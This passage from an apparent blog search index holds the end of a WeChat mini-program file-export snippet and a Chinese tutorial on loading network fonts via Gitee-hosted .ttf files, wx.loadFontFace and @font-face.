function_">hideLoading</span>();</span><br><span class="line">                        wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">                            <span class="attr">title</span>: <span class="string">&#x27;保存文件失败&#x27;</span>,</span><br><span class="line">                            <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;下载文件失败:&#x27;</span>, err);</span><br><span class="line">                wx.<span class="title function_">hideLoading</span>();</span><br><span class="line">                wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&#x27;下载失败&#x27;</span>,</span><br><span class="line">                    <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;云函数调用失败:&#x27;</span>, err);</span><br><span class="line">        wx.<span class="title function_">hideLoading</span>();</span><br><span class="line">        wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;导出失败&#x27;</span>,</span><br><span class="line">            <span class="attr">icon</span>: <span class="string">&#x27;none&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>微信小程序加载网络字体</title>
    <url>/2023/11/26/wxxcxwlzt/</url>
    <content><![CDATA[<h1 id="关于微信小程序字体更换问题"><a href="#关于微信小程序字体更换问题" class="headerlink" title="关于微信小程序字体更换问题"></a>关于微信小程序字体更换问题</h1><p>在制作微信小程序换字体时，如果直接使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">decode</span> <span class="attr">class</span>=<span class="string">&quot;SwiperTitle&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-family:宋体 ;&quot;</span>&gt;</span>宋体宋体宋体<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在电脑预览时，字体确实会变成宋体（下图</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105411286.png" alt="image-20240705105411286"></p>
<p>但是当在手机上预览时，因为手机并没有“宋体”这个预制的字体，所以手机并不会将字体改成宋体</p>
<span id="more"></span>

<img src="/2023/11/26/wxxcxwlzt/image-20240705105517167.png" alt="image-20240705105517167" style="zoom: 50%;">

<p>因此，采用网络字体的方式对字体进行更新</p>
<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>一个字体文件起码好几兆，所以肯定不能放到本地然后编译进去，只能从网络获取</p>
<p>首先获取一个字体的.ttf文件，然后将这个.ttf文件上传为网络直链地址，最后在小程序里调用这个网络直<br>链地址就完成了对字体的更改。</p>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="1-获取一个字体-ttf文件"><a href="#1-获取一个字体-ttf文件" class="headerlink" title="1.获取一个字体.ttf文件"></a>1.获取一个字体.ttf文件</h2><p>这里使用.ttf .otf等字体文件都可以</p>
<p>我采用的方法是从字体管家下载字体，因为比较靠谱</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105630877.png" alt="image-20240705105630877"></p>
<p>打开之后是这样子的</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105642530.png" alt="image-20240705105642530"></p>
<p>首先我下载了几个字体，大小最好是10M以内的。</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105659354.png" alt="image-20240705105659354"></p>
<p>然后打开字体备份，对想要的字体进行备份</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105709932.png" alt="image-20240705105709932"></p>
<p>然后打开备份文件夹，直接备份后在备份文件夹中就能直接找到下载的字体了（这种找.ttf文件的方法比<br>较方便）</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105725191.png" alt="image-20240705105725191"></p>
<h2 id="2-将-ttf文件上传为网络直链地址"><a href="#2-将-ttf文件上传为网络直链地址" class="headerlink" title="2.将.ttf文件上传为网络直链地址"></a>2.将.ttf文件上传为网络直链地址</h2><p>如果我们有服务器的话可以直接上传到我们的服务器进行访问，但是没有服务器的话我们可以使用Gitee<br>个人仓库上传字体文件————<a href="https://gitee.com/">Gitee</a> (因为Gitee访问起来比较快，所以没用github)</p>
<p>刚登录进去应该就是创建一个仓库，如果没有的话就右上角有个加好，点击创建仓库就可以</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105854907.png" alt="image-20240705105854907"></p>
<p>然后在仓库中上传字体文件，下载字体的时候别下超过10M的，因为传不上去</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105943876.png" alt="image-20240705105943876"></p>
<p>点进这个文件，下面有个下载，这个下载就是一个直链的下载地址了</p>
<p><img src="/2023/11/26/wxxcxwlzt/image-20240705105956298.png" alt="image-20240705105956298"></p>
<p>右键下载，复制链接</p>
<img src="/2023/11/26/wxxcxwlzt/image-20240705110007315.png" alt="image-20240705110007315" style="zoom:50%;">

<h2 id="3-在微信开发者工具中添加网络字体"><a href="#3-在微信开发者工具中添加网络字体" class="headerlink" title="3.在微信开发者工具中添加网络字体"></a>3.在微信开发者工具中添加网络字体</h2><p>在要添加的页面的.js文件中的生命周期函数–监听页面加载onLoad函数中添加一个获取字体，页面加载<br>时就会获取这个.ttf文件</p>
<p>在.js的onLoad函数中添加：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">loadFontFace</span>(&#123;</span><br><span class="line">    <span class="attr">family</span>: <span class="string">&#x27;abcabcabc&#x27;</span>,</span><br><span class="line">    <span class="attr">source</span>: <span class="string">&#x27;url(&quot;url&quot;)&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e, <span class="string">&#x27;动态加载字体成功&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e, <span class="string">&#x27;动态加载字体失败&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>source字段后面的url填写上面获取的文件直链地址</p>
<p>family中填写字体的名字，起个名就可以。</p>
<p>在wxss中添加</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;abcabcabc&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;url&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;opentype&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>url同样填写字体文件直链地址</p>
<p>此时，网络字体就添加好了，然后在我们需要修改字体的text上添加一个style</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">style</span>=<span class="string">&quot;font-family: abcabcabc &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/26/wxxcxwlzt/image-20240705110215808.png" alt="image-20240705110215808"></p>
<p>但这只是在电脑上显示出来了，还要在真机上显示出来，因此到手机上预览</p>
<img src="/2023/11/26/wxxcxwlzt/image-20240705110236259.png" alt="image-20240705110236259" style="zoom:33%;">

<p>这样第三方网络字库就加载完成了</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
</search>
